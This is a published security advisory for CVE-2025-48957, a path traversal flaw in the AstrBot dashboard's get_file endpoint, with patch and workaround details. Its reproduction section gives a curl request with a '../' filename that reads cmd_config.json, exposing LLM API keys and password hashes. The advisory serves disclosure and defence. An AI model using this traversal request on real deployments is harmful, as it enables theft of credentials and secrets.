# [H] AstrBot Has Path Traversal Vulnerability in /api/chat/get_file

## Summary
Severity: High
Advisory: GHSA-cq37-g2qp-3c2p
CVE: CVE-2025-48957
CWE: CWE-23
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-06-04
Source: https://github.com/advisories/GHSA-cq37-g2qp-3c2p
Type: github-advisory

## Affected
- PyPI: `astrbot` — affected >=3.4.4 <3.5.13

## Details
### Impact

This vulnerability may lead to:

* Information disclosure, such as API keys for LLM providers, account passwords, and other sensitive data.

### Reproduce

Follow these steps to set up a test environment for reproducing the vulnerability:

1. Install dependencies and clone the repository:

   ```bash
   pip install uv
   git clone https://github.com/AstrBotDevs/AstrBot && cd AstrBot
   uv run main.py
   ```

2. Alternatively, deploy the program via pip:

   ```bash
   mkdir astrbot && cd astrbot
   uvx astrbot init
   uvx astrbot run
   ```

3. In another terminal, run the following command to exploit the vulnerability:

   ```bash
   curl -L http://0.0.0.0:6185/api/chat/get_file?filename=../../../data/cmd_config.json
   ```

This request will read the `cmd_config.json` config file, leading to the leakage of sensitive data such as LLM API keys, usernames, and password hashes (MD5).

### Patches

The vulnerability has been addressed in [Pull Request #1676](https://github.com/AstrBotDevs/AstrBot/pull/1676) and is included in versions >= v3.5.13. All users are strongly encouraged to upgrade to v3.5.13 or later.

### Workarounds
Users can edit the cmd_config.json file to disable the dashboard feature as a temporary workaround. However, it is strongly recommended to upgrade to version v3.5.13 or later as soon as possible to fully resolve this issue.

### References

* [Pull Request #1676](https://github.com/AstrBotDevs/AstrBot/pull/1676)
* [Issue #1675](https://github.com/AstrBotDevs/AstrBot/issues/1675)

## References
- https://github.com/AstrBotDevs/AstrBot/security/advisories/GHSA-cq37-g2qp-3c2p
- https://nvd.nist.gov/vuln/detail/CVE-2025-48957
- https://github.com/AstrBotDevs/AstrBot/issues/1675
- https://github.com/AstrBotDevs/AstrBot/pull/1676
- https://github.com/AstrBotDevs/AstrBot/commit/cceadf222c46813c7f41115b40d371e7eb91e492
- https://github.com/AstrBotDevs/AstrBot
- https://www.vicarius.io/vsociety/posts/cve-2025-48957-detect-astrbot-dashboard-vulnerability?prevUrl=wizard
- https://www.vicarius.io/vsociety/posts/cve-2025-48957-mitigate-astrbot-dashboard-vulnerability?prevUrl=wizard
